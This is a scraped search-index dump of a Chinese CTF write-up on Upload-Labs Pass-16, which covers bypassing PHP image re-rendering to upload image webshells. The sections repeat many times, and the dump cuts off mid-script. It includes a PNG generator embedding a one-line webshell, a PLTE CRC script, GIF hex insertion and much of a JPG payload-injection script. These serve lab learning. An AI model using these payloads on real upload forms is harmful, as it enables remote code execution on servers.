二次渲染用到了imagecreatefromjpeg函数，官方解释：由文件或 URL 创建一个新图象，返回一图像标识符，代表了从给定的文件名取得的图像（这时候图像对象还是一个空的）。然后判断是否是一个图片文件，如果不是的话执行unlink函数删除文件，否则，为新图片随机一个名称，执行imagejpeg函数把图象输出到新文件 $newfilename。再将之前用户上传的文件$target_path删除掉。 ​ 根据上面的分析就能得出来两种思路： 访问二次渲染之前的上传的文件。 在图片二次渲染以后图片马未失效。 ","date":"2020-11-16","objectID":"/posts/ctf/upload-labs4/:2:0","series":null,"tags":["文件上传漏洞"],"title":"Upload-Labs之Pass-16","uri":"/posts/ctf/upload-labs4/#pass-16"},{"categories":["CTF"],"content":"\r第一种方法​ （Linux环境、php版本7.2.21） ​ 因为二次渲染那部分if、else无论如何都会执行unlink函数删除你的文件，需要在执行imagecreatefromjpeg时报错才能访问到自己原来上传的文件。 ","date":"2020-11-16","objectID":"/posts/ctf/upload-labs4/:3:0","series":null,"tags":["文件上传漏洞"],"title":"Upload-Labs之Pass-16","uri":"/posts/ctf/upload-labs4/#第一种方法"},{"categories":["CTF"],"content":"\rjpg格式\r准备并上传​ 需要准备只含有一句话木马的文件并命名为.jpg格式。直接上传。 文件包含验证​ 上传以后我使用的在线靶场网页中题目部分直接消失了，这就说明函数执行过程中出错导致页面也没有正常返回。然后就可以使用inclue.php文件包含访问刚刚上传的文件 ","date":"2020-11-16","objectID":"/posts/ctf/upload-labs4/:3:1","series":null,"tags":["文件上传漏洞"],"title":"Upload-Labs之Pass-16","uri":"/posts/ctf/upload-labs4/#jpg格式"},{"categories":["CTF"],"content":"\rjpg格式\r准备并上传​ 需要准备只含有一句话木马的文件并命名为.jpg格式。直接上传。 文件包含验证​ 上传以后我使用的在线靶场网页中题目部分直接消失了，这就说明函数执行过程中出错导致页面也没有正常返回。然后就可以使用inclue.php文件包含访问刚刚上传的文件 ","date":"2020-11-16","objectID":"/posts/ctf/upload-labs4/:3:1","series":null,"tags":["文件上传漏洞"],"title":"Upload-Labs之Pass-16","uri":"/posts/ctf/upload-labs4/#准备并上传"},{"categories":["CTF"],"content":"\rjpg格式\r准备并上传​ 需要准备只含有一句话木马的文件并命名为.jpg格式。直接上传。 文件包含验证​ 上传以后我使用的在线靶场网页中题目部分直接消失了，这就说明函数执行过程中出错导致页面也没有正常返回。然后就可以使用inclue.php文件包含访问刚刚上传的文件 ","date":"2020-11-16","objectID":"/posts/ctf/upload-labs4/:3:1","series":null,"tags":["文件上传漏洞"],"title":"Upload-Labs之Pass-16","uri":"/posts/ctf/upload-labs4/#文件包含验证"},{"categories":["CTF"],"content":"\r其他格式​ 如图成功访问就是图片马上传成功了。但是这个方法我只有jpg格式的文件上传成功了，另外两种格式的图片没有上传成功，这个我感觉需要了解imagecreatefromjpeg、imagecreatefrompng、imagecreatefromgif，这三个函数的原理，让其报错即可。 ","date":"2020-11-16","objectID":"/posts/ctf/upload-labs4/:3:2","series":null,"tags":["文件上传漏洞"],"title":"Upload-Labs之Pass-16","uri":"/posts/ctf/upload-labs4/#其他格式"},{"categories":["CTF"],"content":"\r第二种方法​ （windows环境，php版本5.2.17） ​ 这种方法是让图片码在经过二次渲染以后，能保证代码不会被二次渲染给过滤掉。从最简单的一个一个来。 ​ 用到的工具是Beyond Compare 4，是一个文件比较的工具，就是查看图片渲染修改的哪些部分，还可以查看文件的16进制格式。 ","date":"2020-11-16","objectID":"/posts/ctf/upload-labs4/:4:0","series":null,"tags":["文件上传漏洞"],"title":"Upload-Labs之Pass-16","uri":"/posts/ctf/upload-labs4/#第二种方法"},{"categories":["CTF"],"content":"\rGIF格式\r准备并上传​ 上传一个使用copy /b指令制作的图片马，之前文章第13题用过。假设上传的图片马为yoo.gif，上传成功以后再下载下载的文件名为2119840023.gif。 文件比较​ 使用前面说的Beyond Compare 4工具进行比较，左边是渲染前的文件，右边是渲染后的文件，图片中白色的地方就是两个文件相同的地方，红色部分则是文件不同的地方。看的出来图片文件的前面一大部分二次渲染的时候都没有改变，所以我们可以直接将代码放在这一部分逃过二次渲染。\u003c?php phpinfo(); ?\u003e的十六进制是3C 3F 70 68 70 20 70 68 70 69 6E 66 6F 28 29 3B 20 3F 3E直接粘贴插入，在右边框中右键保存文件再进行上传。 文件包含验证​ 上传以后进行文件包含，代码执行成功。 ​ 为了验证我们的想法，我们可以刚刚把上传的图片再下载下载，查看插入的代码是否逃过了二次渲染（废话执行成功了代码肯定在）。 ","date":"2020-11-16","objectID":"/posts/ctf/upload-labs4/:4:1","series":null,"tags":["文件上传漏洞"],"title":"Upload-Labs之Pass-16","uri":"/posts/ctf/upload-labs4/#gif格式"},{"categories":["CTF"],"content":"\rGIF格式\r准备并上传​ 上传一个使用copy /b指令制作的图片马，之前文章第13题用过。假设上传的图片马为yoo.gif，上传成功以后再下载下载的文件名为2119840023.gif。 文件比较​ 使用前面说的Beyond Compare 4工具进行比较，左边是渲染前的文件，右边是渲染后的文件，图片中白色的地方就是两个文件相同的地方，红色部分则是文件不同的地方。看的出来图片文件的前面一大部分二次渲染的时候都没有改变，所以我们可以直接将代码放在这一部分逃过二次渲染。\u003c?php phpinfo(); ?\u003e的十六进制是3C 3F 70 68 70 20 70 68 70 69 6E 66 6F 28 29 3B 20 3F 3E直接粘贴插入，在右边框中右键保存文件再进行上传。 文件包含验证​ 上传以后进行文件包含，代码执行成功。 ​ 为了验证我们的想法，我们可以刚刚把上传的图片再下载下载，查看插入的代码是否逃过了二次渲染（废话执行成功了代码肯定在）。 ","date":"2020-11-16","objectID":"/posts/ctf/upload-labs4/:4:1","series":null,"tags":["文件上传漏洞"],"title":"Upload-Labs之Pass-16","uri":"/posts/ctf/upload-labs4/#准备并上传-1"},{"categories":["CTF"],"content":"\rGIF格式\r准备并上传​ 上传一个使用copy /b指令制作的图片马，之前文章第13题用过。假设上传的图片马为yoo.gif，上传成功以后再下载下载的文件名为2119840023.gif。 文件比较​ 使用前面说的Beyond Compare 4工具进行比较，左边是渲染前的文件，右边是渲染后的文件，图片中白色的地方就是两个文件相同的地方，红色部分则是文件不同的地方。看的出来图片文件的前面一大部分二次渲染的时候都没有改变，所以我们可以直接将代码放在这一部分逃过二次渲染。\u003c?php phpinfo(); ?\u003e的十六进制是3C 3F 70 68 70 20 70 68 70 69 6E 66 6F 28 29 3B 20 3F 3E直接粘贴插入，在右边框中右键保存文件再进行上传。 文件包含验证​ 上传以后进行文件包含，代码执行成功。 ​ 为了验证我们的想法，我们可以刚刚把上传的图片再下载下载，查看插入的代码是否逃过了二次渲染（废话执行成功了代码肯定在）。 ","date":"2020-11-16","objectID":"/posts/ctf/upload-labs4/:4:1","series":null,"tags":["文件上传漏洞"],"title":"Upload-Labs之Pass-16","uri":"/posts/ctf/upload-labs4/#文件比较"},{"categories":["CTF"],"content":"\rGIF格式\r准备并上传​ 上传一个使用copy /b指令制作的图片马，之前文章第13题用过。假设上传的图片马为yoo.gif，上传成功以后再下载下载的文件名为2119840023.gif。 文件比较​ 使用前面说的Beyond Compare 4工具进行比较，左边是渲染前的文件，右边是渲染后的文件，图片中白色的地方就是两个文件相同的地方，红色部分则是文件不同的地方。看的出来图片文件的前面一大部分二次渲染的时候都没有改变，所以我们可以直接将代码放在这一部分逃过二次渲染。\u003c?php phpinfo(); ?\u003e的十六进制是3C 3F 70 68 70 20 70 68 70 69 6E 66 6F 28 29 3B 20 3F 3E直接粘贴插入，在右边框中右键保存文件再进行上传。 文件包含验证​ 上传以后进行文件包含，代码执行成功。 ​ 为了验证我们的想法，我们可以刚刚把上传的图片再下载下载，查看插入的代码是否逃过了二次渲染（废话执行成功了代码肯定在）。 ","date":"2020-11-16","objectID":"/posts/ctf/upload-labs4/:4:1","series":null,"tags":["文件上传漏洞"],"title":"Upload-Labs之Pass-16","uri":"/posts/ctf/upload-labs4/#文件包含验证-1"},{"categories":["CTF"],"content":"\rpng格式​ 这题自己原来打算模仿gif的方法修改图片，但是上传以后下载，对比文件十六进制不同的时候我傻了 ​ 这不同还是一段一段的，根本不可能模仿gif的方法，上面那一段相同的还是图片的头标识部分，修改的话就不是png格式图片，更过不了。 ​ 所以我直接看答案了，还是前言里的博客。png图片由3个以上的数据块组成，然后又分了图片基本信息、实际数据块、辅助数据块blablablabl，而且数据块中还有CRC码，学过计算机网络的都知道CRC码是验证错误的，自己随便插入代码以后不修改CRC码肯定是过不了的。 ​ 所以又出来了两种方法： 修改CRC码 直接生成图片 计算CRC码​ 计算CRC码的python脚本 text import binascii import re png = open(r'1.png','rb') a = png.read() png.close() hexstr = binascii.b2a_hex(a) ''' PLTE crc ''' data = '504c5445'+ re.findall('504c5445(.*?)49444154',hexstr)[0] crc = binascii.crc32(data[:-16].decode('hex')) \u0026 0xffffffff print hex(crc)\r准备​ php底层在对PLTE数据块验证的时候,主要进行了CRC校验.所以可以在该部分写入代码，再重新计算CRC码，再修改原来的CRC码即可。 计算CRC码​ 脚本会打开名为1.png的文件然后输出计算以后的CRC码结果。在把结果覆盖原来的CRC码上传图片就不会出错了。 这个方法我没有尝试，因为我不会python。都2020年了还有人不会python，不会吧不会吧。😒 等我学会在回来改这一篇吧。 直接生成图片（写入实际数据模块）​ 国外大牛的脚本，直接运行就会生成一个图片 text \u003c?php $p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23, 0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae, 0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc, 0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f, 0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c, 0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d, 0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1, 0x66, 0x44, 0x50, 0x33); $img = imagecreatetruecolor(32, 32); for ($y = 0; $y \u003c sizeof($p); $y += 3) { $r = $p[$y]; $g = $p[$y+1]; $b = $p[$y+2]; $color = imagecolorallocate($img, $r, $g, $b); imagesetpixel($img, round($y / 3), 0, $color); } imagepng($img,'./1.png'); ?\u003e\r​ php指令怎么执行？如果你本机有php环境，可以在php的根目录下找到一个名为php.exe的可执行文件，它是php提供的一种CLI模式，也就是命令行模式。我把php脚本放在了php的根目录，然后cmd切换到对应目录执行。 ​ 还有一种方法是借用本地搭建的靶机环境，把php放在目录使用浏览器访问一下即可。 ​ 运行成功以后会找到一个名为1.png的图片。这个就是生成的图片马了。可以尝试上传进行渲染以后下载到本地，使用文件比较验证。 ​ 但是这个生成的图片php代码是\u003c?=$_GET[0]($_POST[1]);?\u003e，应该是个一句话木马但是现在的我还不会用。源码也不知道怎么修改，总之图片渲染以后代码没有被去掉就算成功了吧，应该算吧 ","date":"2020-11-16","objectID":"/posts/ctf/upload-labs4/:4:2","series":null,"tags":["文件上传漏洞"],"title":"Upload-Labs之Pass-16","uri":"/posts/ctf/upload-labs4/#png格式"},{"categories":["CTF"],"content":"\rpng格式​ 这题自己原来打算模仿gif的方法修改图片，但是上传以后下载，对比文件十六进制不同的时候我傻了 ​ 这不同还是一段一段的，根本不可能模仿gif的方法，上面那一段相同的还是图片的头标识部分，修改的话就不是png格式图片，更过不了。 ​ 所以我直接看答案了，还是前言里的博客。png图片由3个以上的数据块组成，然后又分了图片基本信息、实际数据块、辅助数据块blablablabl，而且数据块中还有CRC码，学过计算机网络的都知道CRC码是验证错误的，自己随便插入代码以后不修改CRC码肯定是过不了的。 ​ 所以又出来了两种方法： 修改CRC码 直接生成图片 计算CRC码​ 计算CRC码的python脚本 text import binascii import re png = open(r'1.png','rb') a = png.read() png.close() hexstr = binascii.b2a_hex(a) ''' PLTE crc ''' data = '504c5445'+ re.findall('504c5445(.*?)49444154',hexstr)[0] crc = binascii.crc32(data[:-16].decode('hex')) \u0026 0xffffffff print hex(crc)\r准备​ php底层在对PLTE数据块验证的时候,主要进行了CRC校验.所以可以在该部分写入代码，再重新计算CRC码，再修改原来的CRC码即可。 计算CRC码​ 脚本会打开名为1.png的文件然后输出计算以后的CRC码结果。在把结果覆盖原来的CRC码上传图片就不会出错了。 这个方法我没有尝试，因为我不会python。都2020年了还有人不会python，不会吧不会吧。😒 等我学会在回来改这一篇吧。 直接生成图片（写入实际数据模块）​ 国外大牛的脚本，直接运行就会生成一个图片 text \u003c?php $p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23, 0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae, 0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc, 0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f, 0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c, 0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d, 0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1, 0x66, 0x44, 0x50, 0x33); $img = imagecreatetruecolor(32, 32); for ($y = 0; $y \u003c sizeof($p); $y += 3) { $r = $p[$y]; $g = $p[$y+1]; $b = $p[$y+2]; $color = imagecolorallocate($img, $r, $g, $b); imagesetpixel($img, round($y / 3), 0, $color); } imagepng($img,'./1.png'); ?\u003e\r​ php指令怎么执行？如果你本机有php环境，可以在php的根目录下找到一个名为php.exe的可执行文件，它是php提供的一种CLI模式，也就是命令行模式。我把php脚本放在了php的根目录，然后cmd切换到对应目录执行。 ​ 还有一种方法是借用本地搭建的靶机环境，把php放在目录使用浏览器访问一下即可。 ​ 运行成功以后会找到一个名为1.png的图片。这个就是生成的图片马了。可以尝试上传进行渲染以后下载到本地，使用文件比较验证。 ​ 但是这个生成的图片php代码是\u003c?=$_GET[0]($_POST[1]);?\u003e，应该是个一句话木马但是现在的我还不会用。源码也不知道怎么修改，总之图片渲染以后代码没有被去掉就算成功了吧，应该算吧 ","date":"2020-11-16","objectID":"/posts/ctf/upload-labs4/:4:2","series":null,"tags":["文件上传漏洞"],"title":"Upload-Labs之Pass-16","uri":"/posts/ctf/upload-labs4/#计算crc码"},{"categories":["CTF"],"content":"\rpng格式​ 这题自己原来打算模仿gif的方法修改图片，但是上传以后下载，对比文件十六进制不同的时候我傻了 ​ 这不同还是一段一段的，根本不可能模仿gif的方法，上面那一段相同的还是图片的头标识部分，修改的话就不是png格式图片，更过不了。 ​ 所以我直接看答案了，还是前言里的博客。png图片由3个以上的数据块组成，然后又分了图片基本信息、实际数据块、辅助数据块blablablabl，而且数据块中还有CRC码，学过计算机网络的都知道CRC码是验证错误的，自己随便插入代码以后不修改CRC码肯定是过不了的。 ​ 所以又出来了两种方法： 修改CRC码 直接生成图片 计算CRC码​ 计算CRC码的python脚本 text import binascii import re png = open(r'1.png','rb') a = png.read() png.close() hexstr = binascii.b2a_hex(a) ''' PLTE crc ''' data = '504c5445'+ re.findall('504c5445(.*?)49444154',hexstr)[0] crc = binascii.crc32(data[:-16].decode('hex')) \u0026 0xffffffff print hex(crc)\r准备​ php底层在对PLTE数据块验证的时候,主要进行了CRC校验.所以可以在该部分写入代码，再重新计算CRC码，再修改原来的CRC码即可。 计算CRC码​ 脚本会打开名为1.png的文件然后输出计算以后的CRC码结果。在把结果覆盖原来的CRC码上传图片就不会出错了。 这个方法我没有尝试，因为我不会python。都2020年了还有人不会python，不会吧不会吧。😒 等我学会在回来改这一篇吧。 直接生成图片（写入实际数据模块）​ 国外大牛的脚本，直接运行就会生成一个图片 text \u003c?php $p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23, 0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae, 0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc, 0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f, 0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c, 0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d, 0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1, 0x66, 0x44, 0x50, 0x33); $img = imagecreatetruecolor(32, 32); for ($y = 0; $y \u003c sizeof($p); $y += 3) { $r = $p[$y]; $g = $p[$y+1]; $b = $p[$y+2]; $color = imagecolorallocate($img, $r, $g, $b); imagesetpixel($img, round($y / 3), 0, $color); } imagepng($img,'./1.png'); ?\u003e\r​ php指令怎么执行？如果你本机有php环境，可以在php的根目录下找到一个名为php.exe的可执行文件，它是php提供的一种CLI模式，也就是命令行模式。我把php脚本放在了php的根目录，然后cmd切换到对应目录执行。 ​ 还有一种方法是借用本地搭建的靶机环境，把php放在目录使用浏览器访问一下即可。 ​ 运行成功以后会找到一个名为1.png的图片。这个就是生成的图片马了。可以尝试上传进行渲染以后下载到本地，使用文件比较验证。 ​ 但是这个生成的图片php代码是\u003c?=$_GET[0]($_POST[1]);?\u003e，应该是个一句话木马但是现在的我还不会用。源码也不知道怎么修改，总之图片渲染以后代码没有被去掉就算成功了吧，应该算吧 ","date":"2020-11-16","objectID":"/posts/ctf/upload-labs4/:4:2","series":null,"tags":["文件上传漏洞"],"title":"Upload-Labs之Pass-16","uri":"/posts/ctf/upload-labs4/#准备"},{"categories":["CTF"],"content":"\rpng格式​ 这题自己原来打算模仿gif的方法修改图片，但是上传以后下载，对比文件十六进制不同的时候我傻了 ​ 这不同还是一段一段的，根本不可能模仿gif的方法，上面那一段相同的还是图片的头标识部分，修改的话就不是png格式图片，更过不了。 ​ 所以我直接看答案了，还是前言里的博客。png图片由3个以上的数据块组成，然后又分了图片基本信息、实际数据块、辅助数据块blablablabl，而且数据块中还有CRC码，学过计算机网络的都知道CRC码是验证错误的，自己随便插入代码以后不修改CRC码肯定是过不了的。 ​ 所以又出来了两种方法： 修改CRC码 直接生成图片 计算CRC码​ 计算CRC码的python脚本 text import binascii import re png = open(r'1.png','rb') a = png.read() png.close() hexstr = binascii.b2a_hex(a) ''' PLTE crc ''' data = '504c5445'+ re.findall('504c5445(.*?)49444154',hexstr)[0] crc = binascii.crc32(data[:-16].decode('hex')) \u0026 0xffffffff print hex(crc)\r准备​ php底层在对PLTE数据块验证的时候,主要进行了CRC校验.所以可以在该部分写入代码，再重新计算CRC码，再修改原来的CRC码即可。 计算CRC码​ 脚本会打开名为1.png的文件然后输出计算以后的CRC码结果。在把结果覆盖原来的CRC码上传图片就不会出错了。 这个方法我没有尝试，因为我不会python。都2020年了还有人不会python，不会吧不会吧。😒 等我学会在回来改这一篇吧。 直接生成图片（写入实际数据模块）​ 国外大牛的脚本，直接运行就会生成一个图片 text \u003c?php $p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23, 0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae, 0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc, 0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f, 0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c, 0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d, 0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1, 0x66, 0x44, 0x50, 0x33); $img = imagecreatetruecolor(32, 32); for ($y = 0; $y \u003c sizeof($p); $y += 3) { $r = $p[$y]; $g = $p[$y+1]; $b = $p[$y+2]; $color = imagecolorallocate($img, $r, $g, $b); imagesetpixel($img, round($y / 3), 0, $color); } imagepng($img,'./1.png'); ?\u003e\r​ php指令怎么执行？如果你本机有php环境，可以在php的根目录下找到一个名为php.exe的可执行文件，它是php提供的一种CLI模式，也就是命令行模式。我把php脚本放在了php的根目录，然后cmd切换到对应目录执行。 ​ 还有一种方法是借用本地搭建的靶机环境，把php放在目录使用浏览器访问一下即可。 ​ 运行成功以后会找到一个名为1.png的图片。这个就是生成的图片马了。可以尝试上传进行渲染以后下载到本地，使用文件比较验证。 ​ 但是这个生成的图片php代码是\u003c?=$_GET[0]($_POST[1]);?\u003e，应该是个一句话木马但是现在的我还不会用。源码也不知道怎么修改，总之图片渲染以后代码没有被去掉就算成功了吧，应该算吧 ","date":"2020-11-16","objectID":"/posts/ctf/upload-labs4/:4:2","series":null,"tags":["文件上传漏洞"],"title":"Upload-Labs之Pass-16","uri":"/posts/ctf/upload-labs4/#计算crc码-1"},{"categories":["CTF"],"content":"\rpng格式​ 这题自己原来打算模仿gif的方法修改图片，但是上传以后下载，对比文件十六进制不同的时候我傻了 ​ 这不同还是一段一段的，根本不可能模仿gif的方法，上面那一段相同的还是图片的头标识部分，修改的话就不是png格式图片，更过不了。 ​ 所以我直接看答案了，还是前言里的博客。png图片由3个以上的数据块组成，然后又分了图片基本信息、实际数据块、辅助数据块blablablabl，而且数据块中还有CRC码，学过计算机网络的都知道CRC码是验证错误的，自己随便插入代码以后不修改CRC码肯定是过不了的。 ​ 所以又出来了两种方法： 修改CRC码 直接生成图片 计算CRC码​ 计算CRC码的python脚本 text import binascii import re png = open(r'1.png','rb') a = png.read() png.close() hexstr = binascii.b2a_hex(a) ''' PLTE crc ''' data = '504c5445'+ re.findall('504c5445(.*?)49444154',hexstr)[0] crc = binascii.crc32(data[:-16].decode('hex')) \u0026 0xffffffff print hex(crc)\r准备​ php底层在对PLTE数据块验证的时候,主要进行了CRC校验.所以可以在该部分写入代码，再重新计算CRC码，再修改原来的CRC码即可。 计算CRC码​ 脚本会打开名为1.png的文件然后输出计算以后的CRC码结果。在把结果覆盖原来的CRC码上传图片就不会出错了。 这个方法我没有尝试，因为我不会python。都2020年了还有人不会python，不会吧不会吧。😒 等我学会在回来改这一篇吧。 直接生成图片（写入实际数据模块）​ 国外大牛的脚本，直接运行就会生成一个图片 text \u003c?php $p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23, 0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae, 0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc, 0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f, 0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c, 0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d, 0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1, 0x66, 0x44, 0x50, 0x33); $img = imagecreatetruecolor(32, 32); for ($y = 0; $y \u003c sizeof($p); $y += 3) { $r = $p[$y]; $g = $p[$y+1]; $b = $p[$y+2]; $color = imagecolorallocate($img, $r, $g, $b); imagesetpixel($img, round($y / 3), 0, $color); } imagepng($img,'./1.png'); ?\u003e\r​ php指令怎么执行？如果你本机有php环境，可以在php的根目录下找到一个名为php.exe的可执行文件，它是php提供的一种CLI模式，也就是命令行模式。我把php脚本放在了php的根目录，然后cmd切换到对应目录执行。 ​ 还有一种方法是借用本地搭建的靶机环境，把php放在目录使用浏览器访问一下即可。 ​ 运行成功以后会找到一个名为1.png的图片。这个就是生成的图片马了。可以尝试上传进行渲染以后下载到本地，使用文件比较验证。 ​ 但是这个生成的图片php代码是\u003c?=$_GET[0]($_POST[1]);?\u003e，应该是个一句话木马但是现在的我还不会用。源码也不知道怎么修改，总之图片渲染以后代码没有被去掉就算成功了吧，应该算吧 ","date":"2020-11-16","objectID":"/posts/ctf/upload-labs4/:4:2","series":null,"tags":["文件上传漏洞"],"title":"Upload-Labs之Pass-16","uri":"/posts/ctf/upload-labs4/#直接生成图片写入实际数据模块"},{"categories":["CTF"],"content":"\rjpg格式​ 同样看答案。国外大牛写的脚本jpg_payload.php，可以向jpg图片里写入代码 php ?php /* The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled(). It is necessary that the size and quality of the initial image are the same as those of the processed image. 1) Upload an arbitrary image via secured files upload script 2) Save the processed image and launch: jpg_payload.php \u003cjpg_name.jpg\u003e In case of successful injection you will get a specially crafted image, which should be uploaded again. Since the most straightforward injection method is used, the following problems can occur: 1) After the second processing the injected data may become partially corrupted. 2) The jpg_payload.php script outputs \"Something's wrong\". If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image. Sergey Bobrov @Black2Fan. See also: https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/ */ $miniPayload = \"\u003c?=phpinfo();?\u003e\"; if(!extension_loaded('gd') || !function_exists('imagecreatefromjpeg')) { die('php-gd is not installed'); } if(!isset($argv[1])) { die('php jpg_payload.php \u003cjpg_name.jpg\u003e'); } set_error_handler(\"custom_error_handler\"); for($pad = 0; $pad \u003c 1024; $pad++) { $nullbytePayloadSize = $pad; $dis = new DataInputStream($argv[1]); $outStream = file_get_contents($argv[1]); $extraBytes = 0; $correctImage = TRUE; if($dis-\u003ereadShort() != 0xFFD8) { die('Incorrect SOI marker'); } while((!$dis-\u003eeof()) \u0026\u0026 ($dis-\u003ereadByte() == 0xFF)) { $marker = $dis-\u003ereadByte(); $size = $dis-\u003ereadShort() - 2; $dis-\u003eskip($size); if($marker === 0xDA) { $startPos = $dis-\u003eseek(); $outStreamTmp = substr($outStream, 0, $startPos) . $miniPayload . str_repeat(\"\\0\",$nullbytePayloadSize) . substr($outStream, $startPos); checkImage('_'.$argv[1], $outStreamTmp, TRUE); if($extraBytes !== 0) { while((!$dis-\u003eeof())) { if($dis-\u003ereadByte() === 0xFF) { if($dis-\u003ereadByte !== 0x00) { break; } } } $stopPos = $dis-\u003eseek() - 2; $imageStreamSize = $stopPos - $startPos; $outStream = substr($outStream, 0, $startPos) . $miniPayload . substr( str_repeat(\"\\0\",$nullbytePayloadSize). substr($outStream, $startPos, $imageStreamSize), 0, $nullbytePayloadSize+$imageStreamSize-$extraBytes) . substr($outStream, $stopPos); } elseif($correctImage) { $outStream = $outStreamTmp; } else { break; } if(checkImage('payload_'.$argv[1], $outStream)) { die('Success!'); } else { break; } } } } unlink('payload_'.$argv[1]); die('Something\\'s wrong'); function checkImage($filename, $data, $unlink = FALSE) { global $correctImage; file_put_contents($filename, $data); $correctImage = TRUE; imagecreatefromjpeg($filename); if($unlink) unlink($filename); return $correctImage; } function custom_error_handler($errno, $errstr, $errfile, $errline) { global $extraBytes, $correctImage; $correctImage = FALSE; if(preg_match('/(\\d+) extraneous bytes before marker/', $errstr, $m)) { if(isset($m[1])) { $extraBytes = (int)$m[1]; } } } class DataInputStream { private $binData; private $order; private $size; public function __construct($filename, $order = false, $fromString = false) { $this-\u003ebinData = ''; $this-\u003eorder = $order; if(!$fromString) { if(!file_exists($filename) || !is_file($filename)) die('File not exists ['.$filename.']'); $this-\u003ebinData = file_get_contents($filename); } else { $this-\u003ebinData = $filename; } $this-\u003esize = strlen($this-\u003ebinData); } public function seek() { return ($this-\u003esize - strlen($this-\u003ebinData)); } public function skip($skip) { $this-\u003ebinData = substr($this-\u003ebinData, $skip); } public function readByte() { if($this-\u003eeof()) { die('End Of File'); } $byte = substr($this-\u003ebinData, 0, 1); $this-\u003ebinData = substr($this-\u003ebinData, 1); return ord($byte); } public function readShort() { if(strlen($this-\u003ebinData) \u003c 2) { die('End Of File'); } $short = substr($this-\u003ebinData, 0, 2); $this-\u003ebinData = substr($this-\u003ebinData, 2); if($this-\u003eorder) { $short =","date":"2020-11-16","objectID":"/posts/ctf/upload-labs4/:4:3","series":null,"tags":["文件上传漏洞"],"title":"Upload-Labs之Pass-16","uri":"/posts/ctf/upload-labs4/#jpg格式-1"},{"categories":["CTF"],"content":"\rjpg格式​ 同样看答案。国外大牛写的脚本jpg_payload.php，可以向jpg图片里写入代码 php ?php /* The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled(). It is necessary that the size and quality of the initial image are the same as those of the processed image. 1) Upload an arbitrary image via secured files upload script 2) Save the processed image and launch: jpg_payload.php In case of successful injection you will get a specially crafted image, which should be uploaded again. Since the most straightforward injection method is used, the following problems can occur: 1) After the second processing the injected data may become partially corrupted. 2) The jpg_payload.php script outputs \"Something's wrong\". If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image. Sergey Bobrov @Black2Fan. See also: https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/ */ $miniPayload = \"\u003c?=phpinfo();?\u003e\"; if(!extension_loaded('gd') || !function_exists('imagecreatefromjpeg')) { die('php-gd is not installed'); } if(!isset($argv[1])) { die('php jpg_payload.php '); } set_error_handler(\"custom_error_handler\"); for($pad = 0; $pad \u003c 1024; $pad++) { $nullbytePayloadSize = $pad; $dis = new DataInputStream($argv[1]); $outStream = file_get_contents($argv[1]); $extraBytes = 0; $correctImage = TRUE; if($dis-\u003ereadShort() != 0xFFD8) { die('Incorrect SOI marker'); } while((!$dis-\u003eeof()) \u0026\u0026 ($dis-\u003ereadByte() == 0xFF)) { $marker = $dis-\u003ereadByte(); $size = $dis-\u003ereadShort() - 2; $dis-\u003eskip($size); if($marker === 0xDA) { $startPos = $dis-\u003eseek(); $outStreamTmp = substr($outStream, 0, $startPos) . $miniPayload . str_repeat(\"\\0\",$nullbytePayloadSize) . substr($outStream, $startPos); checkImage('_'.$argv[1], $outStreamTmp, TRUE); if($extraBytes !== 0) { while((!$dis-\u003eeof())) { if($dis-\u003ereadByte() === 0xFF) { if($dis-\u003ereadByte !== 0x00) { break; } } } $stopPos = $dis-\u003eseek() - 2; 